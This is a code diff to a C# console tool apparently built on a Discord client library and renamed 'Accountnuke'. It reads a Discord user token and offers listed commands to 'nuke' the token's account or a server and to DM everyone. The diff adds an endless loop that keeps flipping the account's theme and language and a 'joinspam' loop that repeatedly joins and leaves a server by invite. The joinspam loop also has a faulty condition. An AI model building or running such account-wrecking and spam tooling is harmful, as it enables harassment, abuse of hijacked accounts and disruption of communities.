@@ -5,7 +5,6 @@ using Console = Colorful.Console;
 using Discord;
 using Discord.Gateway;
 using System.Net;
-using Newtonsoft.Json;
 using System.Linq;
 using System.IO;
 
@@ -15,24 +14,25 @@ namespace Random_Unicode
     {
         static void Main(string[] args)
         {
-            string title = "Anarchy | " + Environment.UserName;
+            string title = "Accountnuke | " + Environment.UserName;
 
             Console.Title = (title);
             Console.ForegroundColor = Color.DeepPink;
             Console.WriteLine(@"
-             █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗██╗  ██╗██╗   ██╗
-            ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██║  ██║╚██╗ ██╔╝
-            ███████║██╔██╗ ██║███████║██████╔╝██║     ███████║ ╚████╔╝ 
-            ██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██╔══██║  ╚██╔╝  
-            ██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██║   ██║   
-            ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝    
-           type help for help, just combining stuff thats already made
+            ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
+            ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
+            ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
+            ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
+            ██║ ╚████║╚██████╔╝██║  ██╗███████╗
+            ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
+                         type help
             ");
             Console.ForegroundColor = Color.MediumPurple;
 
             Console.WriteLine("");
             Console.Write("> token: ");
             string token = Console.ReadLine();
+
             Console.WriteLine("");
             Console.Write("> token set as [" + token + "]");
             Console.WriteLine("");
@@ -78,6 +78,18 @@ namespace Random_Unicode
                         Console.WriteLine("> badge           | " + client.User.PublicBadges.ToString());
                         Console.WriteLine("> lang            | " + client.User.Language.ToString());
                         Console.WriteLine("> avatar url      | " + client.User.Avatar.Url);
+                        int x = 0;
+                        int y = 0;
+                        foreach (var guild in client.GetGuilds())
+                        {
+                            x = x + 1;
+                        }
+                        foreach (var relationship in client.GetRelationships())
+                        {
+                            y = y + 1;
+                        }
+                        Console.WriteLine("> guilds          | " + x);
+                        Console.WriteLine("> friends         | " + y);
                         Console.ForegroundColor = Color.MediumPurple;
                         break;
 
@@ -331,19 +343,53 @@ namespace Random_Unicode
                         Console.ForegroundColor = Color.DeepPink;
                         Console.WriteLine("> sent dm to everyone");
                         Console.ForegroundColor = Color.MediumPurple;
+                        break;
 
+                    case "blink":
+                        Console.ForegroundColor = Color.DeepPink;
+                        Console.WriteLine("");
+                        for (int b = 0; b == 0;)
+                        {
+                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
+                            Console.WriteLine("> set theme to light");
+                            client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Russian });
+                            Console.WriteLine("> set language to russian");
+                            client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
+                            Console.WriteLine("> set theme to dark");
+                            client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Chinese });
+                            Console.WriteLine("> set language to chinese");
+                        }
+                        Console.ForegroundColor = Color.MediumPurple;
+                        break;
+
+                    case "joinspam":
+                        Console.ForegroundColor = Color.DeepPink;
+                        Console.WriteLine("");
+                        Console.Write("> amount: ");
+                        string amount = Console.ReadLine();
+                        Console.Write("> invite: ");
+                        string inv = Console.ReadLine();
+                        int z = Convert.ToInt32(amount);
+                        for (int k = 0; i < z; k++)
+                        {
+                            GuildInvite invite = client.JoinGuild(inv);
+                            invite.Guild.Leave();
+                        }
+                        Console.ForegroundColor = Color.MediumPurple;
                         break;
 
                     case "help":
                         Console.ForegroundColor = Color.DeepPink;
                         Console.WriteLine("");
-                        Console.WriteLine("> info    | token info");
-                        Console.WriteLine("> user    | nuke usertoken");
-                        Console.WriteLine("> server  | nuke server ");
-                        Console.WriteLine("> dmall   | dm everyone available");
-                        Console.WriteLine("> help    | help screen");
-                        Console.WriteLine("> credits | credits");
-                        Console.WriteLine("> exit    | closes the app");
+                        Console.WriteLine("> info     | token info");
+                        Console.WriteLine("> user     | nuke usertoken");
+                        Console.WriteLine("> server   | nuke server ");
+                        Console.WriteLine("> dmall    | dm everyone available");
+                        Console.WriteLine("> blink    | spams random language / theme options");
+                        Console.WriteLine("> joinspam | self explanatory");
+                        Console.WriteLine("> help     | help screen");
+                        Console.WriteLine("> credits  | credits");
+                        Console.WriteLine("> exit     | closes the app");
                         Console.ForegroundColor = Color.MediumPurple;
                         break;
 
@@ -360,9 +406,6 @@ namespace Random_Unicode
                     case "exit":
                         Console.WriteLine("");
                         Environment.Exit(0);
-                        break;
-                    
-                    case "webhook":
                         break;
 
                     default:
